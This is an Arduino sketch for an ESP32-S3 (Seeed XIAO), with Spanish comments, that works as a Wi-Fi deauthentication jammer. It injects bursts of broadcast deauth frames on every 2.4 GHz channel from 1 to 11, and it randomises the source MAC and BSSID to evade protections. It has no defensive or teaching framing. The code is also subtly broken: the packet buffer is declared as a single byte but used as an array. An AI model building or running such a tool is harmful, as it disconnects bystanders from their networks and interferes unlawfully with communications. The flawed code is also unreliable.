#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"

void setup() {
    Serial.begin(115200);

    // Inicializar chip Wi-Fi integrado del ESP32-S3 en modo inyección cruda
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);

    // Configurar LED naranja integrado en la Seeed XIAO (GPIO 21)
    pinMode(21, OUTPUT);
    digitalWrite(21, HIGH); // Apagado inicial (Lógica invertida en la XIAO)

    Serial.println("[XIAO S3] Inicializado correctamente en modo dedicado.");
}

void loop() {
    // Estructura de paquete Deauth Broadcast estándar
    static uint8_t deauthPacket = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dirección de destino (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dirección de origen (MAC aleatoria abajo)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID aleatorio
        0x00, 0x00, 0x07, 0x00
    };

    static int currentChannel = 1;

    // Sintonizar la antena a la frecuencia del canal correspondiente
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[XIAO S3] Escaneando e inyectando en Canal: %d\n", currentChannel);

    // Encender LED integrado (LOW activa la corriente en esta placa)
    digitalWrite(21, LOW);

    // Emitir ráfaga rápida de 8 paquetes modificando la MAC origen para evadir protecciones
    for (int i = 0; i < 8; i++) {
        for (int b = 10; b < 22; b++) {
            deauthPacket[b] = random(0x00, 0xFF);
        }
        // Inyección directa de tramas de control de red 802.11
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(2);
    }

    // Apagar LED naranja y esperar un breve periodo antes del cambio de frecuencia
    digitalWrite(21, HIGH);
    delay(150);

    // Avanzar canal secuencialmente en la banda de 2.4 GHz
    currentChannel++;
    if (currentChannel > 11) {
        currentChannel = 1;
    }
}
